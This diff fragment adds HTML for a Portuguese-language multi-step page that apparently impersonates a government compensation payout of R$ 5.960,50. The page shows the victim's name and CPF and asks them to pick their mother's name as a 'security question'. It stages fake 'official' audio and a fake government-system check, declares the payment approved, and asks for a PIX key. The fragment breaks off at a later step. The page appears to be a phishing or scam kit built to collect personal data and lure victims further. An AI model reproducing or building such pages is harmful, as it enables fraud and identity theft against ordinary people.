+                <p class="text-xs text-gray-500 text-center">Confirme sua identidade</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="bg-gradient-to-r from-green-600 to-green-700 text-white p-4 text-center">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">VERIFICAÇÃO DE SEGURANÇA</span>
+                    </div>
+                    <p class="text-xs opacity-90">Confirme seus dados para prosseguir</p>
+                </div>
+                <div class="p-6">
+                    <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-4 mb-6 text-center">
+                        <h2 class="text-lg font-bold text-green-800 mb-1">
+                            Valor Aprovado para Saque
+                        </h2>
+                        <div class="text-3xl font-bold text-green-600 mb-2">R$ 5.960,50</div>
+                        <p class="text-sm text-green-700">Responda as perguntas a seguir para aprovação do seu saque</p>
+                    </div>
+                    <div class="bg-blue-50 rounded-xl p-4 mb-6">
+                        <h3 class="font-semibold text-blue-900 mb-3 text-sm">Dados Confirmados:</h3>
+                        <div class="space-y-2 text-sm">
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">Nome:</span>
+                                <span class="font-medium text-blue-900 text-right" id="nameUser5"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">CPF:</span>
+                                <span class="font-medium text-blue-900" id="cpfUser5"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="mb-6">
+                        <div class="flex items-center space-x-2 mb-4">
+                            <div class="w-8 h-8 bg-amber-100 rounded-full flex items-center justify-center">
+                                <svg class="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            <h3 class="font-bold text-gray-900 text-lg">Pergunta de Segurança</h3>
+                        </div>
+                        <p class="text-gray-700 mb-4 font-medium">
+                            Para sua segurança, selecione o nome da sua mãe 
+                            entre as opções abaixo:
+                        </p>
+                        <div class="space-y-3">
+                            <button class="option-btn w-full p-4 rounded-xl border-2 transition-all text-left border-gray-200 hover:border-blue-300 hover:bg-blue-50 cursor-pointer">
+                                <div class="flex items-center justify-between">
+                                    <span class="font-medium uppercase">Ana Paula Oliveira</span>
+                                </div>
+                            </button>
+                            <button class="option-btn w-full p-4 rounded-xl border-2 transition-all text-left border-gray-200 hover:border-blue-300 hover:bg-blue-50 cursor-pointer">
+                                <div class="flex items-center justify-between">
+                                    <span class="font-medium uppercase" id="nameM5">Ivone Nascimento</span>
+                                </div>
+                            </button>
+                            <button class="option-btn w-full p-4 rounded-xl border-2 transition-all text-left border-gray-200 hover:border-blue-300 hover:bg-blue-50 cursor-pointer">
+                                <div class="flex items-center justify-between">
+                                    <span class="font-medium uppercase">Francisca dos Santos</span>
+                                </div>
+                            </button>
+                            <button class="option-btn w-full p-4 rounded-xl border-2 transition-all text-left border-gray-200 hover:border-blue-300 hover:bg-blue-50 cursor-pointer">
+                                <div class="flex items-center justify-between">
+                                    <span class="font-medium uppercase">Nenhuma das Opções</span>
+                                </div>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="bg-gray-50 rounded-xl p-3 mb-6 text-center">
+                        <p class="text-sm text-gray-600">
+                            Tentativas restantes: <span class="font-bold text-gray-800">2</span>
+                        </p>
+                    </div>
+                    <div class="space-y-3">
+                        <button onclick="step5to6()" class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
+                            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                            <span>CONFIRMAR RESPOSTA</span>
+                        </button>
+                    </div>
+                    <div class="text-center mt-4">
+                        <div class="flex items-center justify-center space-x-4 text-xs text-gray-500 mb-2">
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                                <span>Verificação Segura</span>
+                            </div>
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                                <span>Dados Protegidos</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-400">Suas informações são protegidas por criptografia</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step6">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Processamento</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">4 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 66.6667%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Análise dos dados</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd"></path><path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z"></path></svg>
+                        <span class="font-bold text-sm">INFORMAÇÕES IMPORTANTES</span>
+                    </div>
+                    <p class="text-xs opacity-90">Ouça as informações importantes</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-center">
+                        <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <svg class="w-10 h-10 text-blue-600 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd"></path></svg>
+                        </div>
+                        <h2 class="text-xl font-bold text-gray-900 mb-4">Informações Importantes</h2>
+                        <p class="text-gray-600 mb-6">Reproduzindo informações sobre sua indenização</p>
+                        <div class="bg-gray-50 rounded-xl p-6 mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <div class="flex items-center space-x-2"><svg class="w-5 h-5 text-gray-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.816L4.846 14H2a1 1 0 01-1-1V7a1 1 0 011-1h2.846l3.537-2.816a1 1 0 011.617.816zM16 10a3 3 0 00-3-3v2a1 1 0 000 2v2a3 3 0 003-3z" clip-rule="evenodd"></path><path d="M18.364 4.636a9 9 0 010 12.728l-1.414-1.414a7 7 0 000-9.9l1.414-1.414z"></path></svg>
+                                    <span class="text-sm font-medium text-gray-700">Informações Oficiais</span>
+                                </div>
+                                <div class="text-sm text-gray-500"><span id="actualTime">00:00</span> / 0:08</div>
+                            </div>
+                            <div class="mb-4">
+                                <div class="w-full bg-gray-200 rounded-full h-2">
+                                    <audio id="audio1" src="./assets/audio/audio1.mp3"></audio>
+                                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-300" style="width: 0%;" id="progress-bar-audio1"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center justify-center space-x-4">
+                                <div class="flex items-center space-x-2">
+                                    <div class="flex space-x-1">
+                                        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0s;"></div>
+                                        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.15s;"></div>
+                                        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.3s;"></div>
+                                        <div class="w-1 h-6 bg-blue-500 rounded-full animate-pulse" style="animation-delay: 0.45s;"></div>
+                                    </div>
+                                    <span class="text-blue-700 text-sm font-medium" id="audioCompleted1">Reproduzindo...</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="rounded-xl p-4 mb-6 bg-blue-50 border border-blue-200">
+                            <div class="flex items-center justify-center space-x-2">
+                                <svg class="w-5 h-5 text-blue-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zM12 6a1 1 0 012 0v8a1 1 0 11-2 0V6z" clip-rule="evenodd"></path></svg>
+                                <span class="text-blue-700 text-sm font-medium">🎵 Reproduzindo informações importantes...</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step7">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Processamento</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">4 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 66.6667%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Análise dos dados</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                        <span class="font-bold text-sm">PROCESSANDO SOLICITAÇÃO</span>
+                    </div>
+                    <p class="text-xs opacity-90">Aguarde enquanto processamos sua solicitação</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-center">
+                        <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <svg class="w-10 h-10 text-blue-600 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                        </div>
+                        <h2 class="text-xl font-bold text-gray-900 mb-4">Solicitando Aprovação</h2>
+                        <p class="text-gray-600 mb-6">Estamos processando sua solicitação de indenização</p>
+                        <div class="mb-6">
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-sm font-medium text-gray-700">Progresso</span>
+                                <span id="percent" class="text-sm font-medium text-blue-600">0%</span>
+                            </div>
+                            <div class="w-full bg-gray-200 rounded-full h-3">
+                                <div id="progress-bar" class="bg-gradient-to-r from-blue-500 to-blue-600 h-3 rounded-full transition-all duration-300" style="width: 0%;"></div>
+                            </div>
+                        </div>
+                        <div class="space-y-3 text-left">
+                            <div class="flex items-center space-x-3">
+                                <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-sm text-gray-700">Dados verificados</span>
+                            </div>
+                            <div class="flex items-center space-x-3">
+                                <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-sm text-gray-700">Segurança confirmada</span>
+                            </div>
+                            <div class="flex items-center space-x-3">
+                                 <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-sm text-gray-700">Consultando sistema governamental</span>
+                            </div>
+                            <div class="flex items-center space-x-3">
+                                 <div class="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
+                                    <svg class="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <span class="text-sm text-gray-700">Aprovando indenização</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step8">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Processamento</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">4 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 66.6667%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Análise dos dados</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">INDENIZAÇÃO APROVADA</span>
+                    </div>
+                    <p class="text-xs opacity-90">Parabéns! Sua indenização foi aprovada</p>
+                </div>
+                <div class="p-6">
+                    <div class="text-center">
+                        <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <svg class="w-10 h-10 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        </div>
+                        <h2 class="text-2xl font-bold text-gray-900 mb-2">🎉 Parabéns!</h2>
+                        <p class="text-gray-600 mb-6">Sua indenização foi aprovada com sucesso!</p>
+                        <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-6 mb-6">
+                            <h3 class="font-bold text-green-800 mb-2">Valor Aprovado</h3>
+                            <div class="text-3xl font-bold text-green-600 mb-2">R$ 5.960,50</div>
+                            <p class="text-sm text-green-700">Será transferido via PIX</p>
+                        </div>
+                        <div class="bg-blue-50 rounded-xl p-4">
+                            <p class="text-blue-700 text-sm">Redirecionando para informar dados de recebimento...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step9">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Processamento</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">4 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 66.6667%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Análise dos dados</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">INDENIZAÇÃO APROVADA</span>
+                    </div>
+                    <p class="text-xs opacity-90">Informe sua chave PIX para receber</p>
+                </div>
+                <div class="p-6">
+                    <div>
+                        <div class="text-center mb-6">
+                            <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <svg class="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path></svg>
+                            </div>
+                            <h2 class="text-xl font-bold text-gray-900 mb-2">Dados para Recebimento</h2>
+                            <p class="text-gray-600 text-sm">Informe sua chave PIX para receber R$ 5.960,50</p>
+                        </div>
+                        <div class="bg-blue-50 rounded-xl p-4 mb-6">
+                            <h3 class="font-semibold text-blue-900 mb-3 text-sm">Beneficiário:</h3>
+                            <div class="space-y-2 text-sm">
+                                <div class="flex justify-between items-center">
+                                    <span class="text-blue-700">Nome:</span>
+                                    <span class="font-medium text-blue-900 text-right" id="nameUser9"></span>
+                                </div>
+                                <div class="flex justify-between items-center">
+                                    <span class="text-blue-700">CPF:</span>
+                                    <span class="font-medium text-blue-900" id="cpfUser9"></span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mb-4">
+                            <label class="block text-sm font-semibold text-gray-900 mb-3">Tipo de Chave PIX:</label>
+                            <div class="grid grid-cols-2 gap-2 mb-6" id="pixOptions">
+                                <button data-type="text" data-placeholder="Digite seu CPF" class="pix-btn p-3 rounded-lg border-2 transition-all text-sm border-gray-200 hover:border-green-300">📄 CPF</button>
+                                <button data-type="email" data-placeholder="Digite seu e-mail" class="pix-btn p-3 rounded-lg border-2 transition-all text-sm border-gray-200 hover:border-green-300">📧 E-mail</button>
+                                <button data-type="tel" data-placeholder="Digite seu telefone" class="pix-btn p-3 rounded-lg border-2 transition-all text-sm border-gray-200 hover:border-green-300">📱 Telefone</button>
+                                <button data-type="text" data-placeholder="Chave aleatória (32 caracteres)" class="pix-btn p-3 rounded-lg border-2 transition-all text-sm border-gray-200 hover:border-green-300">🔑 Aleatória</button>
+                            </div>
+
+                                <!-- Input da chave PIX -->
+                                <div class="mb-6">
+                                    <label for="pixKey" class="block text-sm font-semibold text-gray-900 mb-2">Chave PIX:</label>
+                                    <input id="pixKey" placeholder="Chave aleatória (32 caracteres)" class="w-full p-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 text-lg" type="text" value="">
+                                </div>
+                        </div>
+
+
+                        <div class="space-y-3">
+                            <button id="confirmBtn" onclick="step9to10()" class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z"></path></svg>
+                                <span>CONFIRMAR CHAVE PIX</span>
+                            </button>
+                        </div>
+                        <div class="bg-gray-50 rounded-xl p-4 mt-6"><div class="flex items-start space-x-3">
+                            <svg class="w-5 h-5 text-gray-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                            <div>
+                                <h4 class="font-semibold text-gray-800 text-sm mb-1">Transferência Segura</h4>
+                                <p class="text-gray-600 text-xs">
+                                    O valor será transferido em até 2 horas úteis após a confirmação. Suas informações são protegidas.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+       
+        </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step10">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Confirmação</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">5 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 83.3333%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Dados de recebimento</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-blue-600 to-blue-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">CONFIRMAR DADOS</span>
+                    </div>
+                    <p class="text-xs opacity-90">Verifique se os dados estão corretos</p>
+                </div>
+                <div class="p-6"><div>
+                    <div class="text-center mb-6">
+                        <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <svg class="w-8 h-8 text-blue-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-3a1 1 0 00-.867.5 1 1 0 11-1.731-1A3 3 0 0113 8a3.001 3.001 0 01-2 2.83V11a1 1 0 11-2 0v-1a1 1 0 011-1 1 1 0 100-2zm0 8a1 1 0 100-2 1 1 0 000 2z" clip-rule="evenodd"></path></svg>
+                        </div>
+                        <h2 class="text-xl font-bold text-gray-900 mb-2">Confirme seus Dados</h2>
+                        <p class="text-gray-600 text-sm">Verifique se as informações estão corretas antes de prosseguir</p>
+                    </div>
+                    <div class="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-xl p-6 mb-6 text-center">
+                        <h3 class="font-bold text-green-800 mb-2">Valor a Receber</h3>
+                        <div class="text-3xl font-bold text-green-600 mb-2">R$ 5.960,50</div>
+                        <p class="text-sm text-green-700">Via transferência PIX</p>
+                    </div>
+                    <div class="bg-blue-50 rounded-xl p-4 mb-6">
+                        <h3 class="font-semibold text-blue-900 mb-3 text-sm">Beneficiário:</h3>
+                        <div class="space-y-2 text-sm">
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">Nome:</span>
+                                <span class="font-medium text-blue-900 text-right" id="nameUser10"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">CPF:</span>
+                                <span class="font-medium text-blue-900" id="cpfUser10"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-purple-50 border border-purple-200 rounded-xl p-4 mb-6">
+                        <h3 class="font-semibold text-purple-900 mb-3 text-sm flex items-center">
+                            <span class="mr-2">🔑</span>Chave PIX </h3>
+                            <div class="bg-white rounded-lg p-3 border border-purple-200">
+                                <p class="font-mono text-lg text-gray-900 break-all" id="chavePix10"></p>
+                            </div>
+                        </div>
+                        <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
+                            <div class="flex items-start space-x-3">
+                                <svg class="w-5 h-5 text-amber-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                                <div>
+                                    <h4 class="font-bold text-amber-800 text-sm mb-1">Atenção!</h4>
+                                    <p class="text-amber-700 text-sm">Confirme se a chave PIX está correta. Após a confirmação, não será possível alterar os dados.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="space-y-3">
+                            <button onclick="step10to11()" class="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
+                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path></svg>
+                                <span>GERAR COMPROVANTE</span>
+                            </button>
+                            <button onclick="step10to9()" class="w-full bg-amber-100 hover:bg-amber-200 text-amber-800 font-semibold py-3 px-6 rounded-xl transition-colors flex items-center justify-center space-x-2">
+                                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M13.586 3.586a2 2 0 112.828 2.828l-.793.793-2.828-2.828.793-.793zM11.379 5.793L3 14.172V17h2.828l8.38-8.379-2.83-2.828z"></path></svg>
+                                <span>CORRIGIR CHAVE PIX</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step11">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Confirmação</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">5 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 83.3333%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Dados de recebimento</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="text-white p-4 text-center transition-all duration-500 bg-gradient-to-r from-green-600 to-green-700">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
